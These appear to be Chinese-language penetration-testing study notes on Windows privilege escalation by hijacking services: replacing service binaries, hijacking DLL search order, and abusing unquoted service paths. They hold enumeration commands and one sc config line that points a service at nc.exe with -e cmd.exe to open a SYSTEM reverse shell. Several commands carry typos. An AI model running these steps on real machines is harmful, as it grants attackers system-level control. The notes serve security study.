# 劫持服务文件提权

## Windows替换服务二进制文件提权 
原理：有时用户安装软件作为 window 服务时，可能会将权限给到最大（对所有文件含有读写权限）并且其他用户或者用户组对其含有修改权，例如安装 mysql 时的管理员权限，低权限用户可能会替换服务软件导致权限提升
**查看运行中的服务**
使用 GUI 界面，win+r 后输入 services. Msc 进入服务列表
使用 powershell 查看
`Get-CimInstance -ClassName win32_serivce | Select Name,State,PathName | where-Object {$_.State -like 'Runnning'}`
`accessckh administrators -c *`   查看用户组下所有服务
`access ckh users -c *`
`accesschk.exe -uwcqv "users"  * `     查看user组可读写的服务
`net start | find "服务名称"  `  查看指定的服务名称有没有启动
`sc qc kdc  `    查看服务信息，kdc为服务名称  ，通过查看服务信息获取为系统权限的服务进行修改。
`sc config kdc binpath= "c:\temp\nc.exe -nv 192.168..200 3344 -e cmd.exe"`
`sc config kdc obj=".\LocalSystem" password=""`
`net start kdc`
*当使用网络登录 (如 WinRM 或绑定 shell)时，Get-CimInstance 和 Get-Service 在使用非管理用户查询服务时将导致“permission denied”错误。使用交互式登录 (如 RDP)可以解决这个问题*
 ^db8a4c
**获得可疑服务应用时，然后查看他们的权限**
`icalcls "c:\abc.exe"`
查看可执行文件的权限，F（完全权限），R（可读），X（可执行）, 获得可读可写权限时，替换二进制文件
也可以使用 powershell 中的 `Get-Acl` 获取目标权限列表
**生成病毒文件**
使用 kali 中跨平台编译器
`x86_64-w64-mingw32-gcc 病毒软件.c -o output.exe`
**重启服务**
有时修改完目标服务软件，然后重启服务，这时有可能没有权限，一般管理员才有权限操纵服务开启关闭
可以查看此服务是否是开机自动开启
`Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}`
如果是 `Auto`，则可以重启主机运行病毒软件
`Whoami /priv `查能干什么看当前用户权限



## Windows劫持服务 DLL 提权
有时没有权限修改服务对应的 exe 文件，即没有写权限
可以劫持 DLL
有两种方法：
第一：劫持服务应用使用的 DLL（需要对于 DLL 的修改权限）同替换服务二进制文件提权
第二：劫持 windows 的 DLL search order（DLL 搜索顺序）
*DLL search order 是由微软实现的，因为大量的 DLL 劫持向量，并确保 DLL 更难以劫持。下面的清单显示了取自 Microsoft 文档的标准搜索顺序*
`1. The directory from which the application loaded.`
`2. The system directory.`
`3. The 16-bit system directory.`
`4. The Windows directory. `
`5. The current directory.`
`6. The directories that are listed in the PATH environment variable.`
`  Listing 56 - Standard DLL search order on current Windows versions`
**寻找可以服务程序**
**使用 procmon 64. Exe 查看进程**
了解服务使用的 DLL，但是要查看 DLL 需要管理员权限，所以可以将服务安装到本地进行测试
*使用 procmon 后可能信息过于庞大，使用 filter 过滤想要的服务*
**确定出现 NAME NOT FOUND 错误，这可以作为突破点**
`$env:path `  查看环境变量
**依据 DLL 搜索顺序，注入同名 DLL，最后重启服务**
`Restart-Service 服务名`


  
## Windows错误的服务路径提权
如果该文件的路径包含一个或多个空格，并且没有用引号括起来，则可能会成为特权升级攻击的机会
条件：对于服务的主目录或者子目录可以修改
该示例使用未加引号的服务二进制路径 C:\Program Files\My Program\My service \service. Exe。当 Windows 启动该服务时，由于路径中的空格，它将使用以下顺序尝试启动可执行文件。
`  C:\Program.exe`
`  C:\Program Files\My.exe`
`  C:\Program Files\My Program\My.exe`
`  C:\Program Files\My Program\My service\service.exe`
**找到含有空格路径的服务名称**
获取服务进程
`Get-CimInstance -ClassName win32_service | Select Name,State,PathName `
**快速获取没有加双引号的服务路径**
`wmic service get name,pathname | findstr /i /v "c:\Windows\\" | findstr /i /v "“"`
**利用空格截取，在目标目录插入注入软件**
**重启服务**
